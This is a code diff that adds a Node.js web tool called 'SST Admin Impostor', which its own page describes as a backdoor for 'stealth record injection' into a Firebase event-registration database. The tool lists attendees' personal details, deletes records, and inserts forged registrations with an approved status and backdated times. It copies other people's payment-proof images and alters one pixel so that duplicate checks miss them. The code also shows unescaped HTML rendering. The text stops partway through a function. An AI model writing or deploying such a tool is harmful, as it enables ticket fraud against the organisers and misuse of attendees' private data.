@@ -1,0 +1,941 @@
+import { initializeApp } from 'firebase/app';
+import { getFirestore, collection, addDoc, getDocs, doc, updateDoc, deleteDoc } from 'firebase/firestore';
+import { firebaseConfig } from './firebase-config.js';
+import http from 'http';
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const server = http.createServer(async (req, res) => {
+    // Basic CORS for local testing
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
+
+    if (req.method === 'OPTIONS') {
+        res.writeHead(204);
+        res.end();
+        return;
+    }
+
+    if (req.method === 'GET' && req.url === '/') {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        res.end(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>SST Admin Impostor</title>
+                <link rel="preconnect" href="https://fonts.googleapis.com">
+                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+                <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+                <style>
+                    :root {
+                        --bg-main: #050505;
+                        --bg-glass: rgba(20, 20, 20, 0.65);
+                        --bg-glass-hover: rgba(35, 35, 35, 0.85);
+                        --border-glass: rgba(255, 255, 255, 0.08);
+                        --text-primary: #ffffff;
+                        --text-secondary: #a1a1aa;
+                        --accent-blue: #3b82f6;
+                        --accent-blue-hover: #2563eb;
+                        --accent-green: #10b981;
+                        --accent-green-hover: #059669;
+                        --input-bg: rgba(255, 255, 255, 0.03);
+                        --input-border: rgba(255, 255, 255, 0.1);
+                    }
+                    * { box-sizing: border-box; margin: 0; padding: 0; }
+                    body {
+                        font-family: 'Inter', sans-serif;
+                        background-color: var(--bg-main);
+                        background-image: 
+                            radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
+                            radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.1) 0px, transparent 50%);
+                        background-attachment: fixed;
+                        color: var(--text-primary);
+                        min-height: 100vh;
+                        padding: 32px;
+                        line-height: 1.5;
+                    }
+                    .container { max-width: 1400px; margin: 0 auto; }
+                    /* Typography */
+                    h2 {
+                        font-weight: 700;
+                        font-size: 28px;
+                        letter-spacing: -0.5px;
+                        background: linear-gradient(to right, #ffffff, #a1a1aa);
+                        -webkit-background-clip: text;
+                        -webkit-text-fill-color: transparent;
+                        margin-bottom: 6px;
+                    }
+                    p.subheading {
+                        color: var(--text-secondary);
+                        font-size: 15px;
+                        margin-bottom: 24px;
+                    }
+                    /* Layout */
+                    .header {
+                        background: var(--bg-glass);
+                        backdrop-filter: blur(16px);
+                        -webkit-backdrop-filter: blur(16px);
+                        border: 1px solid var(--border-glass);
+                        padding: 28px;
+                        border-radius: 16px;
+                        margin-bottom: 32px;
+                        box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
+                    }
+                    .controls {
+                        display: flex;
+                        gap: 16px;
+                        align-items: center;
+                        flex-wrap: wrap;
+                    }
+                    /* Inputs & Buttons */
+                    input, select, textarea {
+                        padding: 12px 18px;
+                        border-radius: 10px;
+                        border: 1px solid var(--input-border);
+                        background: var(--input-bg);
+                        color: var(--text-primary);
+                        font-size: 14px;
+                        outline: none;
+                        font-family: 'Inter', sans-serif;
+                        transition: all 0.3s ease;
+                        width: 100%;
+                    }
+                    input:focus, select:focus, textarea:focus {
+                        border-color: rgba(59, 130, 246, 0.5);
+                        background: rgba(255, 255, 255, 0.05);
+                        box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
+                    }
+                    button {
+                        padding: 12px 24px;
+                        border-radius: 10px;
+                        border: 1px solid rgba(255,255,255,0.1);
+                        background: rgba(255,255,255,0.05);
+                        color: var(--text-primary);
+                        font-weight: 600;
+                        font-size: 14px;
+                        cursor: pointer;
+                        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+                        backdrop-filter: blur(8px);
+                    }
+                    button:not(:disabled):hover {
+                        background: rgba(255,255,255,0.1);
+                        transform: translateY(-1px);
+                        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+                    }
+                    button:not(:disabled):active {
+                        transform: translateY(1px);
+                    }
+                    button:disabled {
+                        opacity: 0.4 !important;
+                        cursor: not-allowed !important;
+                    }
+                    button.fetch-btn {
+                        background: linear-gradient(135deg, var(--accent-blue), #60a5fa);
+                        border: none;
+                        box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+                    }
+                    button.fetch-btn:not(:disabled):hover {
+                        background: linear-gradient(135deg, var(--accent-blue-hover), var(--accent-blue));
+                        box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
+                    }
+                    button.create-btn {
+                        background: linear-gradient(135deg, var(--accent-green), #34d399);
+                        border: none;
+                        box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2);
+                        color: #000;
+                    }
+                    button.create-btn:not(:disabled):hover {
+                        background: linear-gradient(135deg, var(--accent-green-hover), var(--accent-green));
+                        box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);
+                    }
+                    /* Table */
+                    .table-container, .table-wrapper {
+                        background: var(--bg-glass);
+                        backdrop-filter: blur(16px);
+                        border: 1px solid var(--border-glass);
+                        border-radius: 16px;
+                        padding: 1px;
+                        overflow-x: auto;
+                        box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
+                    }
+                    table {
+                        width: 100%;
+                        border-collapse: collapse;
+                        text-align: left;
+                    }
+                    th, td {
+                        padding: 16px 20px;
+                        border-bottom: 1px solid var(--border-glass);
+                        font-size: 14px;
+                        vertical-align: top;
+                    }
+                    th {
+                        background: rgba(0, 0, 0, 0.2);
+                        font-weight: 600;
+                        color: var(--text-secondary);
+                        text-transform: uppercase;
+                        font-size: 12px;
+                        letter-spacing: 0.5px;
+                        white-space: nowrap;
+                    }
+                    tr {
+                        transition: background-color 0.2s;
+                    }
+                    tr:hover td {
+                        background: rgba(255, 255, 255, 0.02);
+                    }
+                    tr:last-child td {
+                        border-bottom: none;
+                    }
+                    /* Custom Scrollbar */
+                    ::-webkit-scrollbar { width: 10px; height: 10px; }
+                    ::-webkit-scrollbar-track { background: transparent; }
+                    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 5px; }
+                    ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
+                    
+                    /* Badges */
+                    .badge {
+                        padding: 6px 12px;
+                        border-radius: 20px;
+                        font-size: 12px;
+                        font-weight: 600;
+                        letter-spacing: 0.3px;
+                        text-transform: capitalize;
+                        display: inline-block;
+                    }
+                    .badge-pending { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }
+                    .badge-approved { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+                    .badge-rejected { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+                    
+                    .loading {
+                        display: none;
+                        color: #60a5fa;
+                        font-weight: 500;
+                        animation: pulse 1.5s infinite;
+                        margin-left: auto;
+                    }
+                    @keyframes pulse {
+                        0% { opacity: 0.6; }
+                        50% { opacity: 1; }
+                        100% { opacity: 0.6; }
+                    }
+                    /* Modals */
+                    .modal-overlay {
+                        position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+                        background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
+                        display: none; justify-content: center; align-items: center; z-index: 1000;
+                        animation: fadeIn 0.2s ease-out;
+                    }
+                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                    .modal-content {
+                        background: #0f1115; border: 1px solid var(--border-glass);
+                        padding: 32px; border-radius: 20px;
+                        width: 90%; max-width: 650px; max-height: 85vh; overflow-y: auto;
+                        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+                    }
+                    .form-group { margin-bottom: 20px; }
+                    .form-group label {
+                        display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-secondary); font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px;
+                    }
+                    .stats-text {
+                        margin-left: auto; color: var(--text-secondary); font-size: 14px; font-weight: 500;
+                        background: rgba(255,255,255,0.05); padding: 8px 16px; border-radius: 20px; border: 1px solid var(--border-glass);
+                    }
+                    .img-preview { max-width: 150px; max-height: 150px; border-radius: 8px; cursor: pointer; border: 1px solid var(--border-glass); transition: all 0.3s ease; object-fit: cover; }
+                    .img-preview:hover { transform: scale(1.05); border-color: var(--accent-blue); box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+                    .nested-card { background: rgba(255, 255, 255, 0.02); border: 1px solid var(--border-glass); padding: 12px; border-radius: 10px; margin-bottom: 8px; font-size: 13px; min-width: 250px; }
+                    .nested-card strong { color: #fff; font-size: 14px; display: block; margin-bottom: 6px; padding-bottom: 6px; border-bottom: 1px solid var(--border-glass); }
+                    .nested-card span.label { color: var(--text-secondary); font-weight: 500; display: inline-block; width: 140px; }
+                    .nested-card span.value { color: #f8fafc; }
+                    pre { background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px; border: 1px solid var(--border-glass); overflow-x: auto; font-size: 12px; color: #a78bfa; white-space: pre-wrap; word-break: break-all; }
+                    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; border-bottom: 1px solid var(--border-glass); padding-bottom: 16px; }
+                    .modal-header h2 { margin: 0; font-size: 22px; background: none; -webkit-text-fill-color: var(--text-primary); }
+                    .modal-close { color: var(--text-secondary); font-size: 24px; cursor: pointer; transition: color 0.2s; }
+                    .modal-close:hover { color: white; }
+                    #imageModal img { max-width: 90%; max-height: 90%; border-radius: 12px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
+                    #imageModal .close { position: absolute; top: 20px; right: 30px; color: #fff; font-size: 40px; font-weight: bold; cursor: pointer; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="header">
+                        <h2>SST Admin Impostor ඞ</h2>
+                        <p class="subheading">The unofficial backdoor for database management and stealth record injection.</p>
+                        
+                        <div class="controls">
+                            <label for="collectionInput" style="font-size: 14px; font-weight: 600; color: var(--text-secondary);">TARGET COLLECTION</label>
+                            <input type="text" id="collectionInput" value="registrations" style="width:220px; cursor:default; opacity: 0.7; font-weight: 500;" title="Double click to edit" readonly ondblclick="this.removeAttribute('readonly'); this.style.cursor='text'; this.style.opacity='1'; this.style.background='rgba(255,255,255,0.08)'; this.focus();" onblur="this.setAttribute('readonly', 'true'); this.style.cursor='default'; this.style.opacity='0.7'; this.style.background='var(--input-bg)';" placeholder="e.g., registrations, users..." />
+                            <button class="fetch-btn" onclick="fetchData()">
+                                <svg style="width:16px; height:16px; display:inline; vertical-align:-3px; margin-right:4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                Fetch Records
+                            </button>
+                            <button class="create-btn" id="createBtn" onclick="openCreateModal()" disabled>
+                                <svg style="width:16px; height:16px; display:inline; vertical-align:-3px; margin-right:4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
+                                Create Custom Record
+                            </button>
+                            <span id="recordCount" class="stats-text" style="white-space: nowrap;"></span>
+                            <span class="loading" id="loading">
+                                <svg style="width:16px; height:16px; display:inline; vertical-align:-3px; margin-right:4px; animation: spin 1s linear infinite;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                Processing...
+                            </span>
+                            <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
+                        </div>
+                    </div>
+                    
+                    <div id="searchContainer" style="display:none; margin-bottom: 24px; align-items: center; gap: 12px; background: rgba(255, 255, 255, 0.03); padding: 16px 24px; border-radius: 12px; border: 1px solid var(--border-glass); box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+                        <svg style="width:20px; height:20px; color:var(--text-secondary);" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                        <input type="text" id="searchInput" placeholder="Search by attendee name..." style="width: 300px; padding: 10px 14px; background: var(--input-bg); border: 1px solid var(--border-glass);" onkeydown="if(event.key === 'Enter') searchRecord()" />
+                        <button class="fetch-btn" style="padding: 10px 20px;" onclick="searchRecord()">Search</button>
+                        <span id="searchResultMsg" style="color: #f87171; font-size: 14px; margin-left: auto; display: none; font-weight: 500;">Record not found</span>
+                    </div>
+
+                    <div id="tableContainer" class="table-wrapper">
+                        <div class="empty-state">Click "Fetch Records" to load data</div>
+                    </div>
+                </div>
+                
+                <!-- Image Viewer Modal -->
+                <div id="imageModal" class="modal-overlay" onclick="this.style.display='none'">
+                    <span class="close">&times;</span>
+                    <img id="modalImage" src="" />
+                </div>
+                
+                <!-- Create Record Modal -->
+                <div id="createModal" class="modal-overlay">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h2>Insert New Record</h2>
+                            <span class="modal-close" onclick="closeCreateModal()">&times;</span>
+                        </div>
+                        <div id="dynamicFormContainer">
+                            <!-- Dynamic fields injected here -->
+                        </div>
+                        <div style="margin-top: 32px; display: flex; justify-content: flex-end; gap: 12px;">
+                            <button style="background: transparent; border: 1px solid var(--border-glass);" onclick="closeCreateModal()">Cancel</button>
+                            <button class="create-btn" id="insertBtn" onclick="submitCustomRecord()">
+                                <svg style="width:16px; height:16px; display:inline; vertical-align:-3px; margin-right:4px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                                Insert into Database
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <script>
+                    let currentColumns = []; // Store the schema so we can build the form
+                    let lastFetchedData = []; // Store fetched data
+                    let currentRandomMs = 0;
+
+                    function showImage(src) {
+                        document.getElementById('modalImage').src = src;
+                        document.getElementById('imageModal').style.display = 'flex';
+                    }
+                
+                    function getCollection() {
+                        const val = document.getElementById('collectionInput').value.trim();
+                        if (!val) { alert('Please enter a collection name'); return null; }
+                        return encodeURIComponent(val);
+                    }
+
+                    async function fetchData() {
+                        const col = getCollection();
+                        if (!col) return;
+                        
+                        document.getElementById('loading').style.display = 'block';
+                        try {
+                            const response = await fetch('/api/data?collection=' + col);
+                            const data = await response.json();
+                            
+                            // Sort data by createdAt (newest first) if available
+                            data.sort((a, b) => {
+                                const tA = (a.createdAt && a.createdAt.seconds) ? a.createdAt.seconds : 0;
+                                const tB = (b.createdAt && b.createdAt.seconds) ? b.createdAt.seconds : 0;
+                                return tB - tA;
+                            });
+                            
+                            // Update total records count
+                            const countEl = document.getElementById('recordCount');
+                            if (countEl) {
+                                let pending = 0, approved = 0, rejected = 0;
+                                let hasStatus = false;
+                                data.forEach(item => {
+                                    if (item.status) {
+                                        hasStatus = true;
+                                        const s = item.status.toLowerCase();
+                                        if (s === 'pending') pending++;
+                                        else if (s === 'approved' || s === 'accepted') approved++;
+                                        else if (s === 'rejected') rejected++;
+                                    }
+                                });
+                                
+                                if (hasStatus) {
+                                    countEl.innerHTML = 'Total: <strong>' + data.length + '</strong>' +
+                                        ' &nbsp;|&nbsp; <span style="color:#f59e0b;">Pending: ' + pending + '</span>' +
+                                        ' &nbsp;|&nbsp; <span style="color:#10b981;">Accepted: ' + approved + '</span>' +
+                                        ' &nbsp;|&nbsp; <span style="color:#ef4444;">Rejected: ' + rejected + '</span>';
+                                } else {
+                                    countEl.innerText = 'Total Records: ' + data.length;
+                                }
+                            }
+                            
+                            lastFetchedData = data;
+                            const createBtn = document.getElementById('createBtn');
+                            if (createBtn) {
+                                createBtn.disabled = false;
+                                createBtn.style.opacity = '1';
+                                createBtn.style.cursor = 'pointer';
+                            }
+                            
+                            renderTable(data);
+                        } catch (e) {
+                            alert('Error fetching data: ' + e.message);
+                            const countEl = document.getElementById('recordCount');
+                            if (countEl) countEl.innerText = '';
+                        } finally {
+                            document.getElementById('loading').style.display = 'none';
+                        }
+                    }
+                    
+                    function formatDate(val) {
+                        if (!val) return '-';
+                        let d = null;
+                        if (typeof val === 'object' && val.seconds !== undefined) {
+                            d = new Date(val.seconds * 1000 + (val.nanoseconds ? val.nanoseconds / 1000000 : 0));
+                        } else if (typeof val === 'string' && Date.parse(val)) {
+                            d = new Date(val);
+                        }
+                        if (d) {
+                            return d.toLocaleString();
+                        }
+                        return null;
+                    }
+                    
+                    function renderAttendees(attendees) {
+                        if (!Array.isArray(attendees)) return '<pre>' + JSON.stringify(attendees) + '</pre>';
+                        if (attendees.length === 0) return '<span style="color:#64748b;">No attendees</span>';
+                        
+                        let html = '<div style="display:flex; flex-direction:column; gap:8px;">';
+                        attendees.forEach((a, i) => {
+                            html += \`<div class="nested-card"><strong>Attendee \${i+1}</strong>\`;
+                            Object.keys(a).sort().forEach(key => {
+                                const val = a[key];
+                                let displayVal = val;
+                                if (val === undefined || val === null || val === '') displayVal = '-';
+                                else if (typeof val === 'object') displayVal = JSON.stringify(val);
+                                
+                                const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
+                                html += \`<div style="display: flex; margin-bottom: 4px;"><span class="label" style="flex-shrink: 0;">\${label}:</span> <span class="value" style="word-break: break-word;">\${displayVal}</span></div>\`;
+                            });
+                            html += \`</div>\`;
+                        });
+                        html += '</div>';
+                        return html;
+                    }
+
+                    function searchRecord() {
+                        const input = document.getElementById('searchInput');
+                        const msg = document.getElementById('searchResultMsg');
+                        if (!input || !lastFetchedData) return;
+                        
+                        const term = input.value.trim().toLowerCase();
+                        if (!term) {
+                            msg.style.display = 'none';
+                            document.querySelectorAll('tr').forEach(tr => { tr.style.backgroundColor = ''; tr.style.boxShadow = ''; });
+                            return;
+                        }
+                        
+                        const match = lastFetchedData.find(item => {
+                            if (!item.attendees || !Array.isArray(item.attendees)) return false;
+                            return item.attendees.some(a => a.name && typeof a.name === 'string' && a.name.toLowerCase().includes(term));
+                        });
+                        
+                        document.querySelectorAll('tr').forEach(tr => { tr.style.backgroundColor = ''; tr.style.boxShadow = ''; });
+                        
+                        if (match && match.id) {
+                            msg.style.display = 'none';
+                            const targetRow = document.getElementById('row_' + match.id);
+                            if (targetRow) {
+                                targetRow.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                                targetRow.style.backgroundColor = 'rgba(59, 130, 246, 0.15)';
+                                targetRow.style.boxShadow = 'inset 0 0 0 2px var(--accent-blue)';
+                            }
+                        } else {
+                            msg.style.display = 'block';
+                        }
+                    }
+
+                    function renderTable(data) {
+                        const container = document.getElementById('tableContainer');
+                        const searchContainer = document.getElementById('searchContainer');
+                        
+                        if (!data || data.length === 0) {
+                            container.innerHTML = '<div class="empty-state">📦 No records found in this collection.</div>';
+                            currentColumns = ['id', 'ticketType', 'amount', 'quantity', 'paymentProof', 'status', 'attendees', 'createdAt']; // accurate fallback
+                            if (searchContainer) searchContainer.style.display = 'none';
+                            return;
+                        }
+                        
+                        if (searchContainer) searchContainer.style.display = 'flex';
+
+                        const allKeys = new Set();
+                        data.forEach(item => {
+                            Object.keys(item).forEach(k => {
+                                if(k !== '_docId') allKeys.add(k); 
+                            });
+                        });
+                        
+                        const preferredOrder = ['id', 'paymentProof', 'attendees', 'amount', 'quantity', 'status', 'createdAt'];
+                        currentColumns = Array.from(allKeys).sort((a, b) => {
+                            const idxA = preferredOrder.indexOf(a);
+                            const idxB = preferredOrder.indexOf(b);
+                            if (idxA !== -1 && idxB !== -1) return idxA - idxB;
+                            if (idxA !== -1) return -1;
+                            if (idxB !== -1) return 1;
+                            return a.localeCompare(b);
+                        });
+
+                        let html = '<table><thead><tr>';
+                        currentColumns.forEach(col => {
+                            const prettyHeader = col.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
+                            html += '<th>' + prettyHeader + '</th>';
+                        });
+                        html += '<th style="text-align:right;">Actions</th>';
+                        html += '</tr></thead><tbody>';
+
+                        data.forEach(item => {
+                            html += '<tr id="row_' + item.id + '">';
+                            currentColumns.forEach(col => {
+                                const val = item[col];
+                                let displayVal = val;
+                                const formattedDate = formatDate(val);
+                                
+                                if (val === undefined || val === null) {
+                                    displayVal = '<span style="color:#64748b; font-style: italic;">null</span>';
+                                } else if (col === 'id') {
+                                    displayVal = '<span style="font-family: monospace; color: #60a5fa; font-size: 14px; font-weight: bold; white-space: nowrap;">' + val + '</span>' +
+                                                 '<br><span style="font-size: 10px; color: #475569;">(DB: ' + item._docId + ')</span>';
+                                } else if (col === 'paymentProof' || (typeof val === 'string' && val.startsWith('data:image'))) {
+                                    displayVal = \`<img src="\${val}" class="img-preview" onclick="event.stopPropagation(); showImage('\${val}')" title="Click to enlarge" />\`;
+                                } else if (col === 'attendees') {
+                                    displayVal = renderAttendees(val);
+                                } else if (formattedDate) {
+                                    displayVal = '<span style="white-space: nowrap; color: #e2e8f0;">' + formattedDate + '</span>';
+                                } else if (typeof val === 'object') {
+                                    displayVal = '<pre>' + JSON.stringify(val, null, 2) + '</pre>';
+                                } else if (typeof val === 'boolean') {
+                                    displayVal = val ? '<span style="color:#10b981; font-weight:bold;">True</span>' : '<span style="color:#ef4444; font-weight:bold;">False</span>';
+                                } else {
+                                    const escaped = String(val).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                                    displayVal = '<div style="white-space: normal; word-break: normal;">' + escaped + '</div>';
+                                }
+                                html += '<td>' + displayVal + '</td>';
+                            });
+                            html += '<td style="text-align:right;"><button class="delete-btn" onclick="deleteRecord(\\'' + item._docId + '\\')">Delete</button></td>';
+                            html += '</tr>';
+                        });
+
+                        html += '</tbody></table>';
+                        container.innerHTML = html;
+                    }
+
+                    // ====== MODAL & INSERT LOGIC ======
+                    
+                    function openCreateModal() {
+                        currentRandomMs = Math.floor(Math.random() * 1000);
+                        if (currentColumns.length === 0) {
+                            currentColumns = ['id', 'ticketType', 'amount', 'quantity', 'paymentProof', 'status', 'attendees', 'createdAt']; // accurate fallback
+                        }
+                        
+                        let defaultBase = 2950;
+                        if (lastFetchedData && lastFetchedData.length > 0) {
+                            for (const item of lastFetchedData) {
+                                if (item.amount && item.quantity && item.quantity > 0) {
+                                    defaultBase = item.amount / item.quantity;
+                                    break;
+                                }
+                            }
+                        }
+                        
+                        let html = '';
+                        currentColumns.forEach(col => {
+                            const prettyLabel = col.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
+                            
+                            if (col === 'amount') {
+                                html += '<div class="form-group"><label>Base Amount</label><input type="number" id="input_baseAmount" min="0" value="' + defaultBase + '" /></div>';
+                                html += '<div class="form-group"><label>Amount (Total)</label><input type="number" id="input_amount" min="0" readonly style="background: rgba(255,255,255,0.02); cursor: not-allowed;" /></div>';
+                            } else if (col === 'id') {
+                                html += '<div class="form-group">';
+                                html += '<label>Id</label>';
+                                html += '<input type="text" id="input_id" readonly style="background: rgba(255,255,255,0.02); cursor: not-allowed;" />';
+                                html += '<small id="id_error" style="color:#ef4444; display:none; margin-top:4px; font-size:12px;">Error: This ID already exists in records!</small>';
+                                html += '</div>';
+                            } else {
+                                html += '<div class="form-group">';
+                                html += '<label>' + prettyLabel + '</label>';
+                                
+                                if (col === 'createdAt') {
+                                    html += '<input type="datetime-local" id="input_' + col + '" step="1" />';
+                                } else if (col === 'status') {
+                                    html += '<select id="input_' + col + '">' +
+                                        '<option value="pending">pending</option>' +
+                                        '<option value="approved">approved</option>' +
+                                        '<option value="rejected">rejected</option>' +
+                                    '</select>';
+                                } else if (col === 'quantity') {
+                                    html += '<input type="number" id="input_' + col + '" min="0" value="1" />';
+                                } else if (col === 'attendees') {
+                                    html += '<textarea id="input_' + col + '" rows="12">[]</textarea>';
+                                } else if (col === 'paymentProof') {
+                                    html += '<select id="input_paymentProof_select" style="margin-bottom:12px; width: 100%;">';
+                                    html += '<option value="">-- Upload New Image --</option>';
+                                    lastFetchedData.forEach(item => {
+                                        if (item.paymentProof && item.paymentProof.startsWith('data:image')) {
+                                            html += '<option value="' + item.paymentProof + '">' + item.id + ' (Existing Proof)</option>';
+                                        }
+                                    });
+                                    html += '</select>';
+                                    html += '<input type="file" id="input_paymentProof_file" accept="image/*" />';
+                                    html += '<img id="paymentProof_preview" src="" style="display:none; max-height: 200px; max-width: 100%; margin-top: 8px; border-radius: 4px;" />';
+                                    html += '<input type="hidden" id="input_paymentProof" />';
+                                } else {
+                                    html += '<input type="text" id="input_' + col + '" />';
+                                }
+                                html += '</div>';
+                            }
+                        });
+                        
+                        document.getElementById('dynamicFormContainer').innerHTML = html;
+                        
+                        // Pre-fill some defaults
+                        if (document.getElementById('input_createdAt')) {
+                            const now = new Date();
+                            now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
+                            // Slice to 19 to include seconds (e.g., 2026-06-29T20:34:02)
+                            document.getElementById('input_createdAt').value = now.toISOString().slice(0,19);
+                        }
+                        
+                        const createdAtInput = document.getElementById('input_createdAt');
+                        const idInput = document.getElementById('input_id');
+                        const idError = document.getElementById('id_error');
+                        const insertBtn = document.getElementById('insertBtn');
+                        
+                        function updateId() {
+                            if (createdAtInput && idInput) {
+                                const dateObj = new Date(createdAtInput.value);
+                                if (!isNaN(dateObj.getTime())) {
+                                    const timeWithMs = dateObj.getTime() + currentRandomMs;
+                                    idInput.value = 'SST-' + timeWithMs.toString().slice(-6);
+                                }
+                                
+                                const exists = lastFetchedData.some(item => item.id === idInput.value);
+                                if (exists) {
+                                    if (idError) idError.style.display = 'block';
+                                    if (insertBtn) {
+                                        insertBtn.disabled = true;
+                                        insertBtn.style.opacity = '0.5';
+                                        insertBtn.style.cursor = 'not-allowed';
+                                    }
+                                } else {
+                                    if (idError) idError.style.display = 'none';
+                                    if (insertBtn) {
+                                        insertBtn.disabled = false;
+                                        insertBtn.style.opacity = '1';
+                                        insertBtn.style.cursor = 'pointer';
+                                    }
+                                }
+                            }
+                        }
+                        
+                        if (createdAtInput) createdAtInput.addEventListener('input', updateId);
+                        updateId(); // Run initial calculation
+                        
+                        const baseInput = document.getElementById('input_baseAmount');
+                        const qtyInput = document.getElementById('input_quantity');
+                        const amountInput = document.getElementById('input_amount');
+                        const attendeesInput = document.getElementById('input_attendees');
+                        
+                        function updateAmount() {
+                            let qty = 0;
+                            if (qtyInput) {
+                                qty = Number(qtyInput.value) || 0;
+                            }
+                            
+                            if (baseInput && amountInput) {
+                                const base = Number(baseInput.value) || 0;
+                                amountInput.value = base * qty;
+                            }
+                            
+                            if (attendeesInput) {
+                                let currentAttendees = [];
+                                try {
+                                    currentAttendees = JSON.parse(attendeesInput.value);
+                                    if (!Array.isArray(currentAttendees)) currentAttendees = [];
+                                } catch (e) {
+                                    currentAttendees = [];
+                                }
+                                
+                                const sample = { 
+                                    name: "Test User", 
+                                    gender: "Male",
+                                    phone: "03211234567",
+                                    batch: "F2021",
+                                    program: "BSCS", 
+                                    studentId: "F2021266XXX",
+                                    email: "test@example.com",
+                                    emergencyName: "John Doe",
+                                    emergencyPhone: "03001234567",
+                                    notes: "None"
+                                };
+                                
+                                if (currentAttendees.length !== qty) {
+                                    if (currentAttendees.length < qty) {
+                                        while (currentAttendees.length < qty) {
+                                            let newAttendee = Object.assign({}, sample);
+                                            newAttendee.name = "Test User " + (currentAttendees.length + 1);
+                                            currentAttendees.push(newAttendee);
+                                        }
+                                    } else if (currentAttendees.length > qty) {
+                                        currentAttendees = currentAttendees.slice(0, qty);
+                                    }
+                                    attendeesInput.value = JSON.stringify(currentAttendees, null, 2);
+                                }
+                            }
+                        }
+                        
+                        if (baseInput) baseInput.addEventListener('input', updateAmount);
+                        if (qtyInput) qtyInput.addEventListener('input', updateAmount);
+                        updateAmount();
+                        
+                        const proofSelect = document.getElementById('input_paymentProof_select');
+                        const proofFile = document.getElementById('input_paymentProof_file');
+                        const proofPreview = document.getElementById('paymentProof_preview');
+                        const proofHidden = document.getElementById('input_paymentProof');
+                        
+                        function updateProofPreview(base64) {
+                            if (base64) {
+                                proofPreview.src = base64;
+                                proofPreview.style.display = 'block';
+                                proofHidden.value = base64;
+                            } else {
+                                proofPreview.src = '';
+                                proofPreview.style.display = 'none';
+                                proofHidden.value = '';
+                            }
+                        }
+
+                        if (proofSelect) {
+                            proofSelect.addEventListener('change', (e) => {
+                                if (e.target.value) {
+                                    proofFile.style.display = 'none';
+                                    
+                                    // Scramble the Base64 by redrawing it on a canvas
+                                    const img = new Image();
+                                    img.onload = function() {
+                                        const canvas = document.createElement('canvas');
+                                        canvas.width = img.width;
+                                        canvas.height = img.height;
+                                        const ctx = canvas.getContext('2d');
+                                        
+                                        // Fill white background in case it's a transparent PNG being converted to JPEG
+                                        ctx.fillStyle = '#FFFFFF';
+                                        ctx.fillRect(0, 0, canvas.width, canvas.height);
+                                        ctx.drawImage(img, 0, 0);
+                                        
+                                        // Tweak the top-left pixel slightly to guarantee a unique hash/string
+                                        const imgData = ctx.getImageData(0, 0, 1, 1);
+                                        imgData.data[0] = (imgData.data[0] === 255) ? 254 : imgData.data[0] + 1;
